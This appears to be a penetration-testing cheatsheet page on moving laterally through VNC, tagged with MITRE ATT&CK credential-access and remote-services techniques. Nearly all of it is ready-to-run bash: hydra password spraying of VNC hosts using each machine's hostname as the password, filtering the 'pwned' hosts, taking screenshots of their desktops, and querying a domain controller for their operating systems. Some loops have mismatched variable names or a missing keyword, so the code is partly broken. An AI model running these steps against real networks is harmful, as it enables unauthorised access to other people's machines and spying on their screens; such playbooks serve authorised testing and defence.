---
layout: post
title: pen / move / vnc
category: pen
parent: cheatsheets
modified_date: 2023-02-07
permalink: /pen/move/vnc
---

**Mitre Att&ck Entreprise**: 
* [TA0006 - Credentials Access](https://attack.mitre.org/tactics/TA0006/)
* [T1021  - Remote Services](https://attack.mitre.org/techniques/T1021/)

**Menu**
<!-- vscode-markdown-toc -->
* [RUN Password Spraying](#RUNPasswordSpraying)
* [EDIT hydra return & LIST pwned machines](#EDIThydrareturnLISTpwnedmachines)
* [VALIDATE LIST + SCREENSHOT of pwned desktops](#VALIDATELISTSCREENSHOTofpwneddesktops)
* [STATS of pwned machines](#STATSofpwnedmachines)
* [FILE TRANSFER](#FILETRANSFER)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='RUNPasswordSpraying'></a>RUN Password Spraying

**Case 1** : vnc_pwd == $ztarg_computer_name 
```bash
# // terminator || tmux / vsplit panel 1 / monitor progression
# // terminator || tmux / vsplit panel 1 / monitor progression / tail 
tail -f pt_XXX_hydra_vnc_output.txt

# // terminator || tmux / vsplit panel 0 / hsplit panel 0 / 
# // terminator || tmux / vsplit panel 0 / hsplit panel 0 / run / pwd spraying over vnc using hydra /
while read ztarg_computer_fqdn; do vnc_pwd=$(echo $ztarg_computer_name | cut -d"." -f1 | tr '[:upper:]' '[:lower:]'); hydra  -p $vnc_pwd vnc://$ztarget_computer_fqdn -w 2/0 -t 4 >> pt_XXX_hydra_vnc_output.txt; done < pt_XXX_getnetcomputers_OU_XXX_all.txt

# // terminator || tmux / vsplit panel 0 / hsplit panel 1 / monitor progression / 
# // terminator || tmux / vsplit panel 0 / hsplit panel 1 / monitor progression / get success conns / 
grep -c successfully pt_XXX_hydra_vnc_output.txt
grep -c "^\[5900\]" pt_XXX_hydra_vnc_output.txt
# // terminator || tmux / vsplit panel 0 / hsplit panel 1 / monitor progression / 
# // terminator || tmux / vsplit panel 0 / hsplit panel 1 / monitor progression / check last $ztarg_computer_name displayed by 'vsplit panel 1 / tail' /
grep -n  $ztarg_computername pt_XXX_getnetcomputers_OU_XXX_all.txt.txt
```

## <a name='EDIThydrareturnLISTpwnedmachines'></a>EDIT hydra return & LIST pwned machines 
```bash
# // terminator || tmux / vsplit panel 0 / hsplit panel 1 / return / format output & list zpwned_computer_name
grep "^\[5900\]" pt_XXX_hydra_vnc_output.txt | cut -f3 -d " " > pt_XXX_hydra_vnc_pwned.txt
grep "^\[5900\]" -A 2 pt_XXX_hydra_vnc_output.txt | cut -f3 -d " " > pt_XXX_hydra_vnc_pwned.txt
```

## <a name='VALIDATELISTSCREENSHOTofpwneddesktops'></a>VALIDATE LIST + SCREENSHOT of pwned desktops
```bash
while read ztarg_computer_fqdn; do export vnc_pwd=$(echo $ztarg_computer_fqdn | cut -d"." -f1 | tr '[:upper:]' '[:lower:]');   echo $vnc_pwd | vncpasswd -f > ./vnc_pwd.txt; echo -n $ztarg_computer_fqdn:; cat vnc_pwd.txt; vncsnapshot -passwd ./vnc_pwd.txt $ztarg_computer_fqdn pt_XXX_hydra_vnc_$ztarg_computer_fqdn.png >> pt_XXX_vncsnapshot_output.txt; done < pt_XXX_hydra_vnc_pwned.txt
```

## <a name='STATSofpwnedmachines'></a>STATS of pwned machines
```bash
# get the cn computer (1 line) and its OS (1 line) 
while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p XXX --dc-ip $zdom_dc_ip --attributes cn operatingSystem >> pt_XXX_getcomputer_XXX_os.txt; done < pt_XXX_hydra_vnc_pwned.txt

# format the result returned to CSV
i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' | tr '\n' ',' >> pt_XXX_getnetcomputer_XXX_os.csv ; elif [[ $i == 2 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' >> pt_XXX_getnetcomputer_XXX_os.csv; i=0; fi; done < pt_XXX_getcomputer_XXX_os.txt
```

Run the playbook [pen_enum_computers_os_piechart](https://github.com/jomivz/jomivz.github.io/playbook/pen_enum_computers_os_piechart.ipynb) to generate the chart pie per operating system.

![computers per OS](/assets/images/playbook_piechart_computers_per_os.png)

## <a name='FILETRANSFER'></a>FILE TRANSFER

Tools to transfer files via VNC (works on Windows 10 only):

* [Invoke-Transfer](https://github.com/JoelGMSec/Invoke-Transfer)